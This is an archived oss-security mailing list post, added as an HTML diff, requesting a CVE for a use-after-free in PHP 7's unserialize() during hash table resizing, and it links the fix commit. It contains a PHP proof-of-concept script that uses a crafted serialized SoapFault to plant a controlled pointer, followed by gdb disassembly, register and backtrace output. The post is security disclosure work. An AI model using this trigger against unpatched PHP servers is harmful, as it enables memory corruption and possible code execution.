@@ -1,0 +1,133 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - CVE request - php 7 use after free</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="../../../2015/08/12/19">[&lt;prev]</a> <a href="2">[next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;tencent_7E6EC45B23A03CC660D66170&#64;qq.com&gt;
+Date: Thu, 13 Aug 2015 11:35:06 +0800
+From: "牛保龙" &lt;niubl&#64;...wnsec.com&gt;
+To: "oss-security" &lt;oss-security&#64;...ts.openwall.com&gt;
+Subject: CVE request - php 7 use after free
+
+Description: ------------ the Hash table is full, resize it,ZEND_HASH_IF_FULL_DO_RESIZE(ht),but if one elment is already allocate in the old memery and re-allocate in the new memry and the var_hash struct also exists the old memery for the element, it can cause a use after free when unserialize() function has r/R referer. my english is poor. i hope i can explain clearly to you. Test script: --------------- &lt;?php $addr = 0x4141414141414141; $sf = new SoapFault('1', 'string', 'detail', 'header','line', str_repeat("A",232).ptr2str($addr)); $ob = unserialize("a:3:{i:0;".serialize($sf).'i:1;r:12;i:2;r:10;}'); //var_dump($ob); function ptr2str($ptr) {     $out = "";     for ($i=0; $i&lt;8; $i++) {         $out .= chr($ptr &amp; 0xff);         $ptr &gt;&gt;= 8;     }     return $out; } ?&gt; Actual result: -------------- (gdb) disassemble $rip ……    0x000000000068cfe5 &lt;+3109&gt;:	cmp    $0xffffffffffffffff,%rsi    0x000000000068cfe9 &lt;+3113&gt;:	je     0x68c538 &lt;php_var_unserialize_ex+376&gt;    0x000000000068cfef &lt;+3119&gt;:	mov    (%rbx),%rdi    0x000000000068cff2 &lt;+3122&gt;:	callq  0x4276f3 &lt;var_access&gt;    0x000000000068cff7 &lt;+3127&gt;:	test   %rax,%rax    0x000000000068cffa &lt;+3130&gt;:	je     0x68c538 &lt;php_var_unserialize_ex+376&gt;    0x000000000068d000 &lt;+3136&gt;:	mov    (%rax),%rdx    0x000000000068d003 &lt;+3139&gt;:	mov    0x8(%rax),%eax    0x000000000068d006 &lt;+3142&gt;:	test   $0x4,%ah    0x000000000068d009 &lt;+3145&gt;:	mov    %rdx,(%r14)    0x000000000068d00c &lt;+3148&gt;:	mov    %eax,0x8(%r14)    0x000000000068d010 &lt;+3152&gt;:	je     0x68c62c &lt;php_var_unserialize_ex+620&gt; =&gt; 0x000000000068d016 &lt;+3158&gt;:	addl   $0x1,(%rdx)    0x000000000068d019 &lt;+3161&gt;:	mov    $0x1,%eax    0x000000000068d01e &lt;+3166&gt;:	jmpq   0x68c53a &lt;php_var_unserialize_ex+378&gt;    0x000000000068d023 &lt;+3171&gt;:	nopl   0x0(%rax,%rax,1)    0x000000000068d028 &lt;+3176&gt;:	cmp    $0x3a,%al    0x000000000068d02a &lt;+3178&gt;:	jne    0x68c538 &lt;php_var_unserialize_ex+376&gt;    0x000000000068d030 &lt;+3184&gt;:	cmpb   $0x22,0x2(%r12)    0x000000000068d036 &lt;+3190&gt;:	jne    0x68c538 &lt;php_var_unserialize_ex+376&gt;    0x000000000068d03c &lt;+3196&gt;:	lea    0x85e11d(%rip),%rax        # 0xeeb160 &lt;zend_standard_class_def&gt;    0x000000000068d043 &lt;+3203&gt;:	mov    %rbp,%rsi    0x000000000068d046 &lt;+3206&gt;:	mov    %r14,%rdi    0x000000000068d049 &lt;+3209&gt;:	mov    %r11,0x10(%rsp)    0x000000000068d04e &lt;+3214&gt;:	mov    (%rax),%rdx    0x000000000068d051 &lt;+3217&gt;:	callq  0x42773c &lt;object_common1&gt; (gdb) info reg rax            0x1400	5120 rbx            0x7fffb2f37fe0	140736195690464 rcx            0xb	11 rdx            0x4141414141414141	4702111234474983745 rsi            0x9	9 rdi            0x7f7d6f854820	140176718645280 rbp            0x7fffb2f37fd8	0x7fffb2f37fd8 rsp            0x7fffb2f37e40	0x7fffb2f37e40 r8             0x0	0 r9             0x652ec731c4b	6953224051787 r10            0x79812b	7962923 r11            0x0	0 r12            0x7f7d6f87b2b1	140176718803633 r13            0x72	114 r14            0x7f7d6f85ba60	140176718674528 r15            0x7f7d6f87b2b2	140176718803634 rip            0x68d016	0x68d016 &lt;php_var_unserialize_ex+3158&gt; eflags         0x10202	[ IF RF ] cs             0x33	51 ss             0x2b	43 ds             0x0	0 es             0x0	0 fs             0x0	0 gs             0x0	0 (gdb) bt #0  0x000000000068d016 in php_var_unserialize_ex (rval=rval&#64;...ry=0x7f7d6f85ba60, p=p&#64;...ry=0x7fffb2f37fd8, max=max&#64;...ry=0x7f7d6f87b2b2 "", var_hash=var_hash&#64;...ry=0x7fffb2f37fe0,      classes=classes&#64;...ry=0x0) at /home/knownsec/Downloads/php-7.0.0beta2/ext/standard/var_unserializer.c:1246 #1  0x000000000068cd03 in process_nested_data (rval=0x7f7d6f85ba60, objprops=0, elements=0, ht=0x7f7d6f855348, classes=0x0, var_hash=0x7fffb2f37fe0, max=0x7f7d6f87b2b2 "", p=0x7fffb2f37fd8)     at /home/knownsec/Downloads/php-7.0.0beta2/ext/standard/var_unserializer.c:389 #2  php_var_unserialize_ex (rval=rval&#64;...ry=0x7f7d6f812160, p=p&#64;...ry=0x7fffb2f37fd8, max=0x7f7d6f87b2b2 "", var_hash=var_hash&#64;...ry=0x7fffb2f37fe0, classes=classes&#64;...ry=0x0)     at /home/knownsec/Downloads/php-7.0.0beta2/ext/standard/var_unserializer.c:870 #3  0x000000000067f0ed in zif_unserialize (execute_data=&lt;optimized out&gt;, return_value=0x7f7d6f812160) at /home/knownsec/Downloads/php-7.0.0beta2/ext/standard/var.c:1037 #4  0x00000000007510ed in ZEND_DO_ICALL_SPEC_HANDLER () at /home/knownsec/Downloads/php-7.0.0beta2/Zend/zend_vm_execute.h:577 #5  0x00000000007412ab in execute_ex (ex=&lt;optimized out&gt;) at /home/knownsec/Downloads/php-7.0.0beta2/Zend/zend_vm_execute.h:406 #6  0x000000000078d8ef in zend_execute (op_array=op_array&#64;...ry=0x7f7d6f883000, return_value=return_value&#64;...ry=0x0) at /home/knownsec/Downloads/php-7.0.0beta2/Zend/zend_vm_execute.h:450 #7  0x000000000070473e in zend_execute_scripts (type=type&#64;...ry=8, retval=retval&#64;...ry=0x0, file_count=file_count&#64;...ry=3) at /home/knownsec/Downloads/php-7.0.0beta2/Zend/zend.c:1399 #8  0x00000000006a7710 in php_execute_script (primary_file=primary_file&#64;...ry=0x7fffb2f3a510) at /home/knownsec/Downloads/php-7.0.0beta2/main/main.c:2475 #9  0x000000000078f163 in do_cli (argc=2, argv=0xff39f0) at /home/knownsec/Downloads/php-7.0.0beta2/sapi/cli/php_cli.c:971 #10 0x000000000042c520 in main (argc=2, argv=0xff39f0) at /home/knownsec/Downloads/php-7.0.0beta2/sapi/cli/php_cli.c:1338 
+
+
+A fix has been committed:<a href="http://git.php.net/?p=php-src.git;a=commit;h=be54eb7db10c6aa838cef969822a5ae0f4e605e3" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=be54eb7db10c6aa838cef969822a5ae0f4e605e3</a>
+
+
+------------------
+北京知道创宇信息技术有限公司
+牛保龙（404实验室）地 址：北京市朝阳区阜安西路望京SOHO中心T3 A座15 层总 机：010-57076191    传  真：010-57076117手 机：13366466891      邮 编：100102网 址：www.knownsec.com</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
